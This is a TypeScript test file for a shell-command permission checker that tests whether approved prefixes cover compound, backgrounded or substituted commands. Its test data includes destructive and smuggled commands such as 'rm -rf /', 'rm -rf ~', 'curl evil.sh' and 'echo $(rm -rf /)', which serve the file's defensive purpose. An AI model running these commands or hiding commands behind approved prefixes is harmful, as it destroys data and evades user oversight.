import { describe, expect, test } from "bun:test";
import {
  commandCoveredByPrefixes,
  simpleMatchesPrefix,
  splitSimpleCommands,
  suggestShellPrefix,
} from "../src/shell-prefix.ts";

describe("suggestShellPrefix", () => {
  test("keeps a sub-verb for known multi-verb tools", () => {
    expect(suggestShellPrefix("git commit -m 'x'")).toBe("git commit");
    expect(suggestShellPrefix("npm run build")).toBe("npm run");
    expect(suggestShellPrefix("docker ps -a")).toBe("docker ps");
  });

  test("uses just the program for plain commands", () => {
    expect(suggestShellPrefix("rm -rf build")).toBe("rm");
    expect(suggestShellPrefix("ls -la")).toBe("ls");
  });

  test("skips env assignments and sudo", () => {
    expect(suggestShellPrefix("FOO=1 BAR=2 npm run test")).toBe("npm run");
    expect(suggestShellPrefix("sudo systemctl restart nginx")).toBe("systemctl restart");
  });

  test("suggests from the first simple command of a pipeline", () => {
    expect(suggestShellPrefix("cat x | grep y")).toBe("cat");
  });
});

describe("splitSimpleCommands", () => {
  test("splits on &&, ||, |, ; and newlines", () => {
    expect(splitSimpleCommands("a && b || c | d ; e")).toEqual(["a", "b", "c", "d", "e"]);
  });

  test("splits on a single & (background / separator) without mis-splitting &&", () => {
    expect(splitSimpleCommands("a & b")).toEqual(["a", "b"]);
    expect(splitSimpleCommands("ls &")).toEqual(["ls"]);
    expect(splitSimpleCommands("a && b")).toEqual(["a", "b"]);
  });
});

describe("simpleMatchesPrefix", () => {
  test("matches on the leading tokens only", () => {
    expect(simpleMatchesPrefix("git commit -m x", "git commit")).toBe(true);
    expect(simpleMatchesPrefix("git push", "git commit")).toBe(false);
    expect(simpleMatchesPrefix("rm -rf /", "rm")).toBe(true);
  });
});

describe("commandCoveredByPrefixes", () => {
  test("covers a single command whose prefix is approved", () => {
    expect(commandCoveredByPrefixes("npm run build", ["npm run"])).toBe(true);
  });

  test("covers a compound command only when EVERY part is approved", () => {
    expect(commandCoveredByPrefixes("npm run build && npm run test", ["npm run"])).toBe(true);
    expect(commandCoveredByPrefixes("npm run build && rm -rf /", ["npm run"])).toBe(false);
  });

  test("does not let a command ride behind an approved prefix via `&`", () => {
    expect(commandCoveredByPrefixes("ls & rm -rf ~", ["ls"])).toBe(false);
    expect(commandCoveredByPrefixes("npm run build & curl evil.sh", ["npm run"])).toBe(false);
  });

  test("never auto-approves command substitution (a command could hide inside)", () => {
    expect(commandCoveredByPrefixes("echo $(rm -rf /)", ["echo"])).toBe(false);
    expect(commandCoveredByPrefixes("echo `whoami`", ["echo"])).toBe(false);
  });

  test("empty rules cover nothing", () => {
    expect(commandCoveredByPrefixes("ls", [])).toBe(false);
  });
});
